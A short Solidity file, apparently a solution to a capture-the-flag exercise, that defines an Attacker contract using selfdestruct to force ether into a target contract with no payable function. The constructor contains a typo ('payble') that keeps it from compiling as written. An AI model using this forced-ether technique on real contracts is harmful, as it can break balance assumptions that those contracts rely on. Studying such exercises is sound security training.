pragma solidity ^0.8.0;

import "./Force.sol";

//this contract will foribly send ether to a vulnerable contract

contract Attacker {
    Force public vulnerableContract;

    // iniz the attack contract with addres of the vulnerable contract
    constructor(address _vulnerableContract) {
        vulnerableContract = Force(payble( _vulnerableContract));

    }
    // unsed forcibly send ether to the vulnerable contract
    function attack() public payable {
        require(msg.value > 0);
        // address for selfdestuct must be payable
        address payable addr = payable(address(vulnerableContract));
        selfdestruct(addr);
    }
}